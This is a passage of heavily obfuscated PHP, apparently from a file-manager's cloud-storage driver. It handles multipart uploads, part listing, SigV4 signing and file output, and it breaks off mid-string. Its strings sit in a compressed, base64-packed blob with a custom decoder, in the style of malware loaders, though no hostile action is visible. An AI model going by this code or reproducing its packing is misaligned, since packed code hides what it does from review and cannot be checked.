$fé“ÆáÉ„ =& $_SERVER[æ§›¦ÌáØ]; $FöÙ¥ÜÀ¼ = gmdate($fé“ÆáÉ„[1308]); $A àŸ‹³À = array(); $AŸÕ³çø† = $this->client->getUploadId($this->bucket, $EİÕÎ÷É…õ, $A àŸ‹³À); if (!$AŸÕ³çø†) { return !1; } return array($fé“ÆáÉ„[221] => $AŸÕ³çø†, $fé“ÆáÉ„[175] => $this->getHost() . $fé“ÆáÉ„[8] . $this->pathEncode($EİÕÎ÷É…õ), $fé“ÆáÉ„[222] => $FöÙ¥ÜÀ¼, $fé“ÆáÉ„[93] => $EİÕÎ÷É…õ); } public function multiUploadAuthData($b—Õ¬¼Ô„‚, $eãÄˆ ÅğÍ = array()) { goto cÌù„¢óÍ±; A…à­ŞÃÎë: if (strpos($A‘ù­íöóÛ, $CîÛ‚Ó‹«Í[225]) === 0) { if (isset($BÁã»ÛŠ‘Ô[$CîÛ‚Ó‹«Í[1310]])) { $fê ’«óÓÏ = $BÁã»ÛŠ‘Ô[$CîÛ‚Ó‹«Í[1310]]; } else { if (isset($E·Ë“ÂÁ·²[$CîÛ‚Ó‹«Í[1310]])) { $fê ’«óÓÏ = $E·Ë“ÂÁ·²[$CîÛ‚Ó‹«Í[1310]]; } else { $fê ’«óÓÏ = hash($CîÛ‚Ó‹«Í[1224], $CîÛ‚Ó‹«Í[33]); } } return array($CîÛ‚Ó‹«Í[232] => $E·Ë“ÂÁ·²[$CîÛ‚Ó‹«Í[232]], $CîÛ‚Ó‹«Í[1310] => $fê ’«óÓÏ, $CîÛ‚Ó‹«Í[222] => $E·Ë“ÂÁ·²[$CîÛ‚Ó‹«Í[1313]]); } return $E·Ë“ÂÁ·²[$CîÛ‚Ó‹«Í[232]]; goto fÍ¦¢š–‰; e¸›î…ãß: if (isset($eãÄˆ ÅğÍ[$CîÛ‚Ó‹«Í[1309]])) { $BÁã»ÛŠ‘Ô[$CîÛ‚Ó‹«Í[1310]] = $eãÄˆ ÅğÍ[$CîÛ‚Ó‹«Í[1309]]; } $D™©Ï¦•ã = explode($CîÛ‚Ó‹«Í[177], $this->getHost()); $CéÁº³Ìº‹ = array($CîÛ‚Ó‹«Í[1311] => $D™©Ï¦•ã[1], $CîÛ‚Ó‹«Í[1312] => $CîÛ‚Ó‹«Í[33], $CîÛ‚Ó‹«Í[211] => $CîÛ‚Ó‹«Í[119], $CîÛ‚Ó‹«Í[1226] => $eãÄˆ ÅğÍ[$CîÛ‚Ó‹«Í[78]]); goto cƒìœ×»÷á; eˆ”º£“…: unset($eãÄˆ ÅğÍ[$CîÛ‚Ó‹«Í[93]]); if (isset($eãÄˆ ÅğÍ[$CîÛ‚Ó‹«Í[223]])) { return $this->listUploadParts($d…·Á˜®‰Ü, $eãÄˆ ÅğÍ); } $BÁã»ÛŠ‘Ô = array(); goto e¸›î…ãß; cƒìœ×»÷á: $EÉÍµ’Ú‘ù = $CîÛ‚Ó‹«Í[226]; $eÔ×Ï¿¸é„ = $CîÛ‚Ó‹«Í[8] . $this->pathEncode($d…·Á˜®‰Ü) . $A‘ù­íöóÛ; $E·Ë“ÂÁ·² = $this->client->__getSignatureV4($BÁã»ÛŠ‘Ô, $CéÁº³Ìº‹, $EÉÍµ’Ú‘ù, $eÔ×Ï¿¸é„); goto A…à­ŞÃÎë; cÌù„¢óÍ±: $CîÛ‚Ó‹«Í =& $_SERVER[æ§›¦ÌáØ]; $A‘ù­íöóÛ = isset($eãÄˆ ÅğÍ[$CîÛ‚Ó‹«Í[168]]) ? $eãÄˆ ÅğÍ[$CîÛ‚Ó‹«Í[168]] : $CîÛ‚Ó‹«Í[33]; $d…·Á˜®‰Ü = $eãÄˆ ÅğÍ[$CîÛ‚Ó‹«Í[93]]; goto eˆ”º£“…; fÍ¦¢š–‰: } public function listUploadParts($e½º›ˆ¨ä, $E‘‘¼¦¼ê = array()) { goto DË­’Ë‡Ü›; E¸§³Ç‡î“: $bÜ”ƒÜñªŒ .= $A‹½¢´ÊÕ [1317]; $BæÃ®Ò·ï = array(); $dá–Ëó§Œ = explode($A‹½¢´ÊÕ [177], $this->getHost()); goto a‡ÓÂê™ØÏ; a‡ÓÂê™ØÏ: $dåå¬ù„˜­ = array($A‹½¢´ÊÕ [1311] => $dá–Ëó§Œ[1], $A‹½¢´ÊÕ [211] => $A‹½¢´ÊÕ [119], $A‹½¢´ÊÕ [1226] => strlen($bÜ”ƒÜñªŒ)); $b÷²“Å‹‹‹ = $A‹½¢´ÊÕ [224]; $c™ì°¹’ñÑ = $A‹½¢´ÊÕ [8] . $this->pathEncode($e½º›ˆ¨ä) . $E‘‘¼¦¼ê[$A‹½¢´ÊÕ [168]]; goto bŠ…Ÿğ‰¥ğ; DË­’Ë‡Ü›: $A‹½¢´ÊÕ  =& $_SERVER[æ§›¦ÌáØ]; $BÅÅ¡óõÑ÷ = str_replace($A‹½¢´ÊÕ [233], $A‹½¢´ÊÕ [33], $E‘‘¼¦¼ê[$A‹½¢´ÊÕ [168]]); $fÈ²ÖÏˆ = $this->client->listParts($this->bucket, $e½º›ˆ¨ä, $BÅÅ¡óõÑ÷); goto a‰÷Àö°±; a‰÷Àö°±: if (!$fÈ²ÖÏˆ) { return !1; } $bÜ”ƒÜñªŒ = $A‹½¢´ÊÕ [1314]; foreach ($fÈ²ÖÏˆ as $aÊÚøèÍ¢”) { $bÜ”ƒÜñªŒ .= $A‹½¢´ÊÕ [1315] . "\74\120\x61\x72\x74\116\x75\x6d\x62\x65\x72\x3e{$aÊÚøèÍ¢”[$A‹½¢´ÊÕ [1271]]}\74\57\120\x61\x72\x74\x4e\x75\x6d\142\145\x72\x3e\12" . "\74\x45\124\x61\147\76{$aÊÚøèÍ¢”[$A‹½¢´ÊÕ [1272]]}\x3c\x2f\105\124\x61\147\x3e\12" . $A‹½¢´ÊÕ [1316]; } goto E¸§³Ç‡î“; bŠ…Ÿğ‰¥ğ: $C—´‹Û‚ã = $this->client->__getSignatureV4($BæÃ®Ò·ï, $dåå¬ù„˜­, $b÷²“Å‹‹‹, $c™ì°¹’ñÑ, $bÜ”ƒÜñªŒ); return array($A‹½¢´ÊÕ [232] => $C—´‹Û‚ã[$A‹½¢´ÊÕ [232]], $A‹½¢´ÊÕ [222] => $C—´‹Û‚ã[$A‹½¢´ÊÕ [1313]], $A‹½¢´ÊÕ [234] => $fÈ²ÖÏˆ, $A‹½¢´ÊÕ [1310] => $C—´‹Û‚ã[$A‹½¢´ÊÕ [1310]]); goto fÖ Ç´ ºî; fÖ Ç´ ºî: } public function link($d£¢¶øŠ, $aµƒ›ÃÏ¿¤ = array()) { return parent::link($d£¢¶øŠ, $aµƒ›ÃÏ¿¤); } public function fileOut($FÓŒè™ÅÚ , $E™ÇĞªñ”å = false, $D‡ÄÇÁêó = false, $B¸¸Ş–Ç¬Ë = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[æ§›¦ÌáØ][1318])) { return parent::fileOutServer($FÓŒè™ÅÚ , $E™ÇĞªñ”å, $D‡ÄÇÁêó, $B¸¸Ş–Ç¬Ë); } parent::fileOut($FÓŒè™ÅÚ , $E™ÇĞªñ”å, $D‡ÄÇÁêó, $B¸¸Ş–Ç¬Ë); } public function fileOutImage($CÑ²ªé´õ‘, $e³À™Ü„øò = 250) { if (strstr($this->endpoint, $_SERVER[æ§›¦ÌáØ][1318])) { return parent::fileOutImageServer($CÑ²ªé´õ‘, $e³À™Ü„øò); } parent::fileOutImage($CÑ²ªé´õ‘, $e³À™Ü„øò); } public function fileOutLink($EÙ™Á¬ÅÆ‹) { $bßÔÜ›¨Î =& $_SERVER[æ§›¦ÌáØ]; if (substr($EÙ™Á¬ÅÆ‹, 0, 7) == $bßÔÜ›¨Î[1194]) { $EÙ™Á¬ÅÆ‹ = $bßÔÜ›¨Î[1195] . substr($EÙ™Á¬ÅÆ‹, 7); } header($bßÔÜ›¨Î[159] . $EÙ™Á¬ÅÆ‹); die; } public function getHost() { $f“š†ƒ…Ô¥ =& $_SERVER[æ§›¦ÌáØ]; $bâŒİ¨Ë‘½ = str_rtrim(parent::getHost(), $f“š†ƒ…Ô¥[8] . $this->bucket); $bâŒİ¨Ë‘½ = explode($f“š†ƒ…Ô¥[177], $bâŒİ¨Ë‘½); return $bâŒİ¨Ë‘½[0] . $f“š†ƒ…Ô¥[177] . $this->bucket . $f“š†ƒ…Ô¥[95] . $bâŒİ¨Ë‘½[1]; } } goto cóÉåÊğÂÉ; eğ«ë”‹ò: if (!function_exists('_kodDe')) { function _kodDe($cøñ ¾é®Æ) { $cøñ ¾é®Æ = base64_decode($cøñ ¾é®Æ); $F‚£†æ¤Ü = strlen($cøñ ¾é®Æ); $EÆ¡®ˆôĞ = ''; $EÏĞõèğ…ñ = ord($cøñ ¾é®Æ[0]) - 30; for ($D½èŠš¥´· = 1; $D½èŠš¥´· < $F‚£†æ¤Ü; $D½èŠš¥´· += 2) { if ($D½èŠš¥´· + 1 < $F‚£†æ¤Ü) { $EÆ¡®ˆôĞ .= chr(ord($cøñ ¾é®Æ[$D½èŠš¥´· + 1]) + $EÏĞõèğ…ñ); $EÆ¡®ˆôĞ .= chr(ord($cøñ ¾é®Æ[$D½èŠš¥´·]) + $EÏĞõèğ…ñ); } else { $EÆ¡®ˆôĞ .= chr(ord($cøñ ¾é®Æ[$D½èŠš¥´·]) + $EÏĞõèğ…ñ); } } return $EÆ¡®ˆôĞ; } } define("\346\247\233\246\314\341\330", "\xe8\xc0\x80\xc1\xe9\x8e\xd9\x93"); $_SERVER[æ§›¦ÌáØ] = explode("\174\1\174\3\174\2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\174\123\125\366\260\373\212\214\353\240\216\350\243\212\135\310\322\262\123\50\65\155\122\32\110\233\222\244\224\116\13\341\45"."\171\151\36\115\362\322\367\136\272\260\70\270\216\210\200\313\210\353\270\341\206\243\50\250\340\270\373\27\305\5\34\127\24\367\121\100\134\307\301\321\121\7\360\273\373\275"."\xef\x25\x75\xfe\xdf\xef\xfb\xf8\x1\xb9\xf7\xdc\xe5\xdd\xe5\xdc\x73\xcf\x39\xf7\xdc\x73\x97\xfc\xfb\xea\xe5\x97\x2e\x7b\xeb\xc1\x27\x77\x2c\x3a\x70\xd1\xc1\x8b\xe\x5a\xbb\xf7\xf5\xf".base64_decode('//jqDysufgvHwT/4PwqfseyIA9Cfg5ddWlbWOP6oUc1DVj50n3xY3Z0/bnpoyw==')."\215\157\176\274\345\236\110\142\352\243\67\166\235\176\300\205\345\303\107\125\203\254\270\144\65\376\221\262\232\51\51\375\252\141\32\30\20\327\262\111\265\13\207\325\54\376"."\x75\xe3\x1f\xa3\x27\xad\x9a\xa\xe\x47\x9b\x83\x91\x68\xb8\xb5\xa5\xc5\x17\x8a\x44\x49\x8d\x62\x7a\x46\x4b\x90\x50\x4e\xd6\xe5\xc\xa9\x3c\xa7\xe8\x6\xf8\x94\x58\x5d\x34\xa7\xe5\x94"."\xac\x5\xc2\x1\x9\xd9\x94\x63\xb2\x41\x6a\xf2\xd6\x45\xbd\xbe\x96\x40\xb0\x3d\x1a\x69\x6f\xf1\x91\x1c\xb1\x68\x4f\x5e\xd1\x7\x70\xc\x5\xc3\xa6\xac\x9b\x11\x35\xa3\xb0\x1c\x7d\x3a".base64_decode('a1edb5q/WYqEPM1hT33EH2zG4PpgU5M/UggPBQOBOk/9jMKUlpBnWpNHAu1LKw==').base64_decode('UTWb1MqkeThlnlSOAw2qkk7gYFamzTEHciQUYSEwB9l8Oo0jzSxE2q8k5XyajA==')."\231\127\214\344\164\65\43\323\256\317\120\6\30\24\7\344\274\251\251\331\70\216\370\372\115\135\346\160\320\342\270\256\144\224\54\251\52\354\13\370\352\43\22\154\246\324".base64_decode('EAo2SWQqMrJhKrrU1ugL+STY9JpS1ONSCZdrbQYDInkCAWmwGkwlk6PV4DJFKg==')."\13\206\274\276\220\124\327\56\361\161\212\153\231\214\226\165\201\132\300\174\232\102\123\175\241\20\16\70\10\6\7\374\160\352\110\44\330\320\20\366\261\30\351\334\314\0"."\150\311\30\202\245\226\130\42\231\66\243\275\162\72\117\221\265\33\377\226\222\37\362\253\31\4\201\173\324\254\232\47\310\112\252\320\64\266\162\110\40\117\163\53\24\242"."\x24\x48\x20\x3\xca\x6b\x64\x71\x81\x95\xd6\x8b\x83\x35\x53\xf1\xef\x64\x92\x29\x16\x85\x69\x8a\x6e\x46\x95\x6c\x5c\x4b\xa8\x59\xb2\x1e\x6b\xc9\xda\x23\x18\x28\x9b\x29\xaf\xae\x82\x7c"."\244\102\315\25\327\162\3\115\132\57\351\114\122\115\53\1\266\334\222\132\72\241\350\74\236\3\305\305\24\322\53\165\201\120\272\71\237\21\263\260\150\74\245\246\23\72"."\135\245\277\226\23\320\1\65\71\300\127\243\241\345\365\270\342\7\353\205\227\155\141\55\251\42\231\24\323\4\235\66\150\277\132\163\151\115\116\204\25\135\350\153\3\50".base64_decode('GMybIjCPsjVoesYL6Ab5PlgtamuRhG66XhLCELoIvSvrOM+5f07HOeC/ckL8Og==').strrev(',T¹]úPššQJŠ.1)ªFÉM?¨à€7Y©ˆÛ«íq‰2®²úU:JRÓI').base64_decode('fbbaOy14D2enWTN9AmVOa3E5LfYUh1OmmQsr2QQcENIjrS+LBiynKCST1yElpA==')."\46\251\135\152\254\126\253\15\132\60\223\146\41\332\73\6\63\30\320\354\47\30\123\102\342\112\277\111\6\105\232\34\117\311\72\230\256\232\274\231\164\116\44\364\45\227"."\113\253\161\331\124\265\254\133\213\233\212\351\64\114\135\221\111\155\236\170\134\61\14\147\275\226\65\165\55\355\364\244\323\132\237\63\250\253\135\152\266\132\252\40\324\30"."\x24\x82\xf5\xee\x84\x14\xb2\x9a\x2c\xe2\x92\xc9\x12\xc4\x15\x48\x20\x2a\xf0\xd7\xe8\xe2\x64\xb9\x75\x39\x6b\x24\x15\xdd\xe9\x23\x8b\xa6\x5a\x2\xf3\xc1\x8\x24\xcd\xe6\x55\x8d\x9c\x66"."\250\260\171\325\222\154\232\162\74\5\211\13\257\276\346\127\362\253\331\264\232\125\12\362\372\372\163\252\256\30\264\255\322\264\246\10\251\4\324\256\70\133\164\271\53\43".base64_decode('V0u5fAyMDFm9RWA4NxmaaikOow4pkzdMp64AKqWC/ZDMsT/pbIJLS1USzjAg5g==')."\x4\x3c\xa6\x72\xac\x4\xd0\x46\xa2\x69\x18\xda\x18\x89\xb4\x44\xfd\xd\x60\xcf\x6e\xf6\x45\x9b\x3c\x91\xfa\x46\xd2\x6c\x53\xee\xa2\x6d\xe\x0\x12\xcd\xaa\xa4\xc0\xd9\x4e\xb0\xc4\x20"."\x62\x35\x83\xbe\x72\x60\x8b\xd6\xa7\xe8\xe0\xc3\x75\x3\xd5\x52\xb7\x96\x88\x69\xfd\x2e\x9a\x4\x33\x87\x1\xd\xa1\x99\xe1\x74\xe7\x4c\x67\x48\xce\x76\xc1\xf1\x89\xd\x98\xa\x41\x3f"."\xa3\xb7\xcb\x3a\xd0\x1\x25\xdb\x65\xa6\x68\xc1\xb0\x2f\x34\xcb\x17\x8a\x86\x83\xd\x91\x36\x4f\x88\xec\xf6\x59\x80\x25\xfd\xf4\x53\xb0\xea\xb4\x33\xa4\x24\xc0\xd0\xc7\x4d\x5a\x4e\xce"."\xc1\x51\xa3\x79\xe0\xc2\x80\x73\x45\x53\xe1\x62\xa1\x69\x1\xff\x34\x38\x30\x5e\xa7\x1\x32\x39\xc5\x5c\xb4\xee\x80\x9a\x51\x61\xdb\x4d\x96\x82\x46\x12\xb0\x2\xd3\x48\x83\xdc\xa8\x43"."\x35\x9d\xa9\x8a\xb2\xce\xc4\xa8\x72\x27\xf8\xbf\xa2\xbc\xa3\xd3\xeb\xaa\x98\x53\xeb\x56\x79\x19\x77\x95\xab\x4a\x1a\x5d\x39\x5e\x6a\x1\xbc\x89\x2a\xa7\x25\xd2\xe9\x82\x1c\x95\x52\x70"."\xc6\xaf\xc\x0\xdc\xba\x84\x65\x6d\x1b\x3a\xc\xc\xf9\x66\xb6\xfa\xc2\x91\x68\x93\x2f\xd2\x18\xf4\x92\x2f\xf8\x3c\x24\x14\xd0\xf0\xd2\xa4\x3d\xea\xc0\x3f\x73\x5c\x9c\x1e\x83\x39\xf7"."\x67\xe4\x2e\x1b\x95\x86\xb1\x26\x4d\x57\xac\x10\xbe\x6b\xb4\xa9\x9\x4a\xc6\x61\xb4\x51\x51\xbb\x52\xa4\x7f\x2a\xac\x2d\xae\xa5\x35\x5d\x4e\x43\x2a\x46\x91\x58\xa1\x94\xa5\x4b\x4d\x92"."\371\301\4\223\107\302\152\46\107\351\232\231\312\147\142\102\220\262\245\140\276\351\366\222\322\330\366\246\351\44\124\355\46\31\107\216\156\240\224\331\35\36\3\376\162\62"."\234\320\62\62\345\166\21\111\122\22\230\46\141\120\205\45\245\121\221\371\176\151\352\246\6\241\272\45\113\223\142\246\64\62\111\135\12\155\122\236\265\215\266\62\241\244"."\x15\x3a\x1a\x29\x85\x92\xf4\x4a\x92\xd\xec\x4c\x6c\xac\x92\x8c\xbc\x3\xc6\xd\x40\xf9\x96\xaa\x1a\x21\x50\x12\x32\x52\x34\xde\x6\xf9\x5d\xe\x30\x59\xd6\x34\xd8\x4d\x82\xb1\xf9\x60"."\271\20\116\102\65\32\204\315\77\252\241\64\320\170\231\347\157\321\225\244\112\26\135\26\314\130\223\254\167\323\2\140\206\370\266\3\43\102\145\15\255\201\100\264\76\330"."\x1c\x1\x3c\x34\x86\xb4\x85\xfc\x11\x1f\xc5\x51\x8f\x37\xea\xa9\x6f\x61\x9b\x28\x9f\x71\x92\x1\x12\x8c\xc2\xdd\x0\x43\x7a\x47\xb\x3b\x11\xdf\xb2\x38\x31\xa7\x5b\x2d\x24\xd6\x38\xc"."\xa8\x73\x4e\xcb\x1a\x8a\x33\x4e\x6a\x4b\x70\xb2\x8e\x73\x4c\xb6\xd1\xf4\x82\x12\x9c\x73\xef\x77\xca\x99\x5\xce\xc\x18\x26\x27\x6b\xba\x75\x87\x95\x22\xe2\x46\xed\x27\xf3\xca\xc9\x37"."\34\130\40\30\321\255\275\45\30\46\5\152\41\24\160\117\61\105\47\355\150\151\45\111\31\1\247\246\371\10\360\50\272\133\313\204\167\362\264\205\51\351\315\203\374\272".base64_decode('ukDmfayl7SF192fSnCG09srJ5yLS6G+eEW0Ken2BqL8Z0KVIIby1xeuhkyvC6w==')."\202\221\106\13\264\25\120\246\131\236\200\337\236\335\67\333\37\216\204\213\46\1\130\253\317\226\2\144\301\226\220\257\301\77\233\105\33\374\276\200\67\34\255\367\324\67".strrev('(]Ò=Á'."\n".'—l'."\0".'ñÊ ÑRŠ€E¨¬)ò…íL™†Ä€£ù­¸f4¡&‰&Í<ò')._kodDe('KpKXEgSiMR3ZJiolKp03Oj6/Gpo+VU/yDYsdVTDAvQ05fPGkAd4Ugfp693CEFlM=').base64_decode('5L6gBVGYp05JMspdHOBJmowK2OJgXfA0MAMeJH4DTEAzEqVrzQDyioc2J8lF3w==')."\x68\xb0\xc5\x17\xf2\x40\xc1\x39\xda\x16\xa\x36\x4f\x23\x5\xfa\x52\xa\x6d\x80\x9f\xc\x7f\x19\x65\x9f\x88\xfc\x6c\x72\x12\x6\x78\x1f\x99\x8a\x50\x7c\xd0\xe7\x6b\x74\x28\x17\xe1\x9f"."\xb3\xf1\xf\x60\xfb\xc8\xc7\x95\x2c\x1d\xf5\x18\xa4\xe6\x8c\x30\x50\x99\x8\xac\x6\x4a\x89\xb5\x3c\xfb\x5a\x4c\xd3\xd2\x74\x9d\x2\xe\x80\xd1\x3\x26\x79\xcf\x37\x28\x92\xf4\x53\xe2"."\x33\x8a\x6e\x69\x64\x47\x89\x4\x67\xf8\x9a\xa3\x14\xb3\x70\x4c\xc0\x46\xc\x0\xb2\x6c\x30\x44\x6\xc4\xd4\xba\xa9\x40\x85\x13\x43\xbe\x30\x5d\xe5\xba\xd2\x93\x57\xe9\x70\xb9\x5d\xa3".strrev('wtî¯-¨Ì¨ÆCJÎ¼ùH³Ñ,ºu‰(àçåšåáÖUìíÏwŸ"Ó`+')."\xba\xcb\x6a\xab\x3b\x3c\xce\x5\xb2\x73\x41\xa5\x73\x92\x73\xce\xa8\x4e\x57\xf9\x28\x2\x98\xb3\x70\xb4\x63\xec\x62\x98\x1\x64\xac\x3d\x73\xe\xf8\xa9\xe9\xac\x1d\xd9\xe9\x3c\xfb\xdc".base64_decode('eed0dM4prR41otN1ZmffnIryWvqdeF4HwmJ8gDU1MaoMNAkwTCxLFpE8IQNNWA==')."\xa0\xe6\x38\x74\xe1\xf8\xc5\x14\xe\xe6\x50\xe9\xe2\x25\x3a\x9c\x9d\xa3\xe6\xd4\xa\xe5\x4\x90\xfd\x5b\x80\x59\x2\xf4\x37\xc5\xf2\x79\x9c\xbf\x87\x3d\x63\x45\xe1\xba\x27\xf8\x91\xcf".base64_decode('xjn1hOsiJscJHVC7smwJAS6ACelWPn3hSPy7mE5kl9JPSUM2qeoEO/NZtYfqIA==')."\262\112\17\11\150\46\305\357\230\142\366\51\24\75\0\334\22\7\310\101\5\103\220\44\304\322\210\55\44\137\340\2\232\202\244\25\322\213\134\24\362\144\175\54\226\120"."\xb2\x64\x9e\x8e\x24\xb9\x8d\xb8\x9c\x53\xc2\x42\xf\xa3\xd1\x88\xa7\x2e\xe0\x8b\x52\xa\x43\x28\x31\x8d\x23\xaa\x58\xc7\xb4\x76\xa0\x6b\x9c\xa2\x52\xfa\x10\xe7\x4c\x3a\x92\x47\xc8\xca".base64_decode('N3rSEiIMkqLrml6NtJNGPgeZOSB7mWBsJSC4SzVTJTzkpFxUnICcTDkHKEsL3A==')."\0\244\120\244\115\71\76\103\6\140\301\50\77\344\56\353\354\314\167\50\211\71\35\0\361\145\147\162\316\302\61\213\313\51\37\357\356\4\177\150\304\123\104\211\26\145"."\324\60\12\366\147\27\154\7\323\203\130\42\54\31\107\65\235\61\115\71\13\333\155\152\246\234\266\124\21\201\20\112\232\350\306\115\124\6\170\266\3\234\142\301\255\134".strrev('iOEŒ•0ÀxM¥a¿°½PÖ>¡)¯ÿˆ‡Xºb°‰`¿¨"LlÌÚr"AĞ')."\x28\xb2\x1e\x4f\x35\xe4\xd3\x69\x93\x71\xfc\x69\xb5\x9b\x54\x4b\x16\xc8\xbc\x62\x79\x1b\x34\x9d\x4a\xb6\x15\xe4\xbb\x25\x15\xc5\x32\xfa\xb3\x59\x20\x87\x8a\x8\xc5\xb7\xd2\x69\x1e\xc0"."\264\104\244\62\252\323\223\374\315\122\135\60\30\360\171\232\45\270\153\223\335\306\357\165\322\362\263\235\176\42\55\261\200\232\240\223\0\50\231\111\241\104\233\105\142\220"."\x79\x74\x40\xc5\x8d\x3\xb2\x8\xe\xd0\x2c\x7\x94\x84\x1c\x9c\x61\x77\x70\x75\x98\x83\xb1\xcb\xe\xc2\x45\x3b\x4c\x59\x7\x1b\x3c\x64\x73\x49\xd0\xef\x75\xa8\x86\x17\x89\x8\xa8\x5e"."\x94\x44\xdb\x61\xa6\xa0\x66\x22\x2d\xf\x38\x70\x9b\x2\x4a\xaf\x92\x76\xd0\x16\x39\x68\x43\x1d\x94\xc5\x77\x20\x91\xcd\x4b\x5a\xd3\xa\x16\x3\x69\xd\xa\x2\x9a\x97\x72\xc0\xe9\x87".base64_decode('2OfgWjryOUGmcHB5w9Gla/lcC/2SEMONIQDeUgYIaZrpoDKko1C8LD5kxZuOxg==')._kodDe('MOzGIFseLV6XeDZMxdQm10QPVnacxzbXeVIssbd+lYCcsKJeUWd+BFZITQ2eYPs=').base64_decode('r4hUxRCM7gYUGbm2nCtzOXdqlxPtqlj40YjcFRY+Z8pd9FtFUnE4pMQH4lzW9A==')."\12\22\254\65\306\306\35\255\213\142\310\135\174\76\31\302\262\171\70\352\310\43\351\100\122\54\146\163\151\101\376\101\127\33\357\123\60\307\67\164\110\102\303\140\153\21"."\x88\x24\x5\x5\x39\x4d\xce\x13\x6\x44\x36\x88\x28\x0\xf5\xab\x24\xa4\x50\x18\xef\x8a\x38\xd8\xa8\x3f\x76\x0\x1d\x1d\xcb\x77\x61\x94\x23\xa\x1d\x2\x9\x7e\xc0\x21\x6c\x99\x70\x95"."\70\371\224\13\121\362\243\152\121\74\356\321\14\223\342\331\104\330\10\72\234\227\26\65\73\240\146\105\55\13\207\362\75\201\157\111\20\161\155\172\41\357\140\141\114\13".strrev('a])d¦Ê	q'."\r".'¨Òd'."\n".'İ:A‚S–¶MIÛB¢ÃÖ€!W;w– ;´AÇ¹')."\315\271\356\12\146\341\121\41\133\122\356\345\333\245\245\214\260\116\14\163\200\266\136\14\132\53\305\121\357\140\221\106\46\152\27\213\212\113\120\65\2\140\354\212\205\121"."\117\43\132\321\50\124\0\321\260\206\360\237\236\307\132\166\63\44\254\226\121\30\331\26\243\202\10\313\126\246\265\34\156\240\207\21\67\300\137\246\1\45\327\135\160\61"."\x4d\x83\x84\x59\x24\x8e\x8c\x98\x19\x70\x13\x20\x35\x20\xa6\x41\x5c\x9a\x18\x67\xc3\xa\x58\x57\x24\xf\xaf\x3f\x5c\x90\x26\xe6\xe6\xa\xd\x48\xa\x39\xe9\xa4\x73\xc1\x57\x2a\x9f\x1f"."\xbe\x2c\x2d\xa8\xd4\xc5\xdb\x9e\x7\x39\xa2\x85\x8d\x82\xcb\xa1\x78\xbc\x41\xd7\x18\xdf\xc6\x36\x40\x7b\xa6\x7a\x24\x18\x99\xe2\x64\x8\xbb\x97\x30\x74\x96\x8d\xb6\x0\x24\x94\xb1\x6f"."\xb9\x36\xa8\x2d\xca\x67\xc0\x42\xac\x31\x88\xaa\x4d\xe5\x44\x46\xcd\xba\x74\x4c\xf6\x5d\x80\xdd\x25\x7\xa0\x8e\x4a\x81\x17\xe1\xb4\x6b\xa1\x81\x26\x93\x6c\x13\x8b\x6d\x28\x61\x2\xd1"."\72\46\353\56\35\174\231\67\210\160\260\171\66\15\163\110\253\120\125\74\237\100\76\121\112\100\243\322\30\244\10\276\204\152\102\10\44\370\32\325\265\362\214\302\41\44"."\x83\x89\xf4\x18\xe\x80\xab\x60\x12\x38\xa3\xea\x18\x69\xc9\x59\x6c\xb3\x73\x55\xa0\xfd\xc9\xc5\xb7\x63\x71\x33\x17\xcf\x59\xe1\x49\x2d\xe\x9\xc6\x9\x19\x76\x74\x8b\x80\x2e\xc3\xd4".strrev('w	QNº={ğ8Ci\\²¼6¤‹)/(h>8˜>ĞÚƒbä*W‰!dâˆE<r')."\xaa\x88\x1\x50\x4\x41\xaa\x15\xa6\xeb\xa0\xd8\x36\x84\x2b\xf7\xf5\x72\xa3\x3\x5c\x15\xfc\xb0\xb\xaf\x4a\x97\x9c\x48\x4\xa9\xca\x56\xc\x17\x66\x15\x35\x58\xc5\x2b\x42\x76\x20\xac"."\52\41\126\74\273\47\235\346\247\303\366\370\240\105\360\2\24\13\211\220\101\213\65\40\351\211\36\343\24\203\61\306\133\144\57\255\354\44\77\253\267\263\235\126\112\73"."\70\157\62\10\341\341\23\132\74\16\366\361\372\224\232\125\14\266\35\353\106\221\36\103\314\34\154\232\140\232\240\143\4\142\64\0\210\73\35\123\244\161\242\40\154\346"."\150\143\214\232\26\66\44\204\352\20\120\325\62\372\140\151\340\221\204\204\331\37\4\250\137\34\37\354\371\24\252\112\104\24\246\137\55\326\121\60\177\220\207\31\254\116"."\232\314\252\342\14\317\317\53\267\343\300\103\217\334\172\353\262\133\176\306\221\330\202\170\266\307\24\255\200\16\305\141\156\356\265\170\366\102\355\275\155\47\155\256\374\152"."\xe1\xed\x4d\xf1\xdb\xe7\xde\xb1\x7b\xdf\xec\x6b\x6e\x5d\x7f\xfa\x86\xd3\xb6\xaf\x1f\xb9\x7d\xe0\xbe\x11\xae\x17\x67\x5c\xf1\xdb\x17\x67\xcc\xb9\x72\xd5\x8e\x9d\x37\xcf\xeb\xb8\x61\xff"."\x6b\xb7\x3e\x3b\x7a\xde\x29\xe3\xd3\xcf\x1c\x96\x7e\x7a\xdb\xed\x4f\x5f\xfc\xdb\xee\x75\xda\x98\xcd\xdf\x6c\x7c\x67\xe4\x3f\xfe\x7a\xcd\xed\xc3\x87\x1d\xeb\xfd\xd0\x88\x7e\xf6\xcf\xc9".base64_decode('7k/u6DpheO3+Dz/9R+1+z021B82ftHdr67Pq6pmvvtRa/+mf1jRFEiu/nbLp3A==')."\313\333\326\171\312\322\67\235\76\351\301\330\137\147\271\307\265\234\27\336\273\344\260\115\147\37\35\370\351\344\201\17\313\314\237\36\353\372\143\170\324\167\256\273\176\374"."\x65\xee\xfc\x67\x8e\x3b\x4e\x3b\x75\x7d\x66\xe4\xbf\xaa\x5a\x2f\x7b\xf5\xd0\x55\x1b\x8e\xb8\xce\xff\xfc\x5d\xe1\x9e\x8e\x8b\xff\xba\xea\xb7\xb3\x37\x65\x1e\xfc\xa0\x72\xe9\x65\xe7\x38"."\xde\x6c\xdc\x7d\xd8\xd3\xf2\xc9\xc7\x56\xfc\xd8\xf8\xe0\xa8\x6f\x6a\x4f\x3e\xa6\xac\xb7\x71\xc9\x1d\x17\x8e\xbf\xb8\xbc\x36\xb2\xfd\xd8\xd\xa1\x4b\x67\x5d\xaa\x75\x9c\xda\x7c\xc2\x69".base64_decode('gbsmTrrkwisPf9l/nfzmB7W7V5S+9Mzdfztyo6Nt88uPdy3YuOOJPa4f6mo+uQ==').base64_decode('oKL8poqhR40NX7H+wwWzXxg385vbr1747RsdL/3xy9xhU05zdq56M/nw7ytWPQ==')."\x73\xf9\xa9\x73\xbf\x58\x70\xc2\x29\x27\x45\x3e\x3d\x71\xf8\xef\x56\x1d\xbd\xe5\xeb\x21\x93\xf7\x2a\x53\xe\x7c\x6b